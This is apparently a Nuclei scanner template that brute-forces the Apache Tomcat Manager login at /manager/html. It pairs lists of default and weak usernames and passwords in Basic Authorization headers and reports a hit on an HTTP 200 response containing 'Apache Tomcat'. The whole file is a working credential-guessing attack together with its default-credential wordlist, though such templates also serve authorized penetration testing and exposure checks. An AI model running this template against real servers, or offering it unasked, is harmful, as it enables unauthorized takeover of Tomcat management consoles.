http:
- attack: clusterbomb
  matchers:
  - status:
    - 200
    type: status
  - type: word
    words:
    - Apache Tomcat
  matchers-condition: and
  payloads:
    password:
    - admin
    - guest
    - password
    - test
    - 12345
    - 123456
    - s3cret
    - j5Brn9
    - ADMIN
    - Tomcatadm
    - changethis
    - password1
    - r00t
    - Password1
    - nagios
    username:
    - admin
    - tomcat
    - cxsdk
    - j2deployer
    - ovwebusr
    - QCC
    - role
    - role1
    - root
    - xampp
    - nagios
  raw:
  - 'GET /manager/html HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(username + ":" + password)}}

    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
    Gecko) Chrome/55.0

    Accept-Language: en-US,en;q=0.9

    Connection: close

    '
id: tomcat-manager-bruteforce
info:
  author: thanhnx
  description: 'This template performs a brute force attack against the Apache Tomcat
    Manager application using provided usernames and passwords.

    '
  name: Tomcat Manager Brute Force Fuzzing
  severity: high
  tags: brute-force,tomcat,authentication
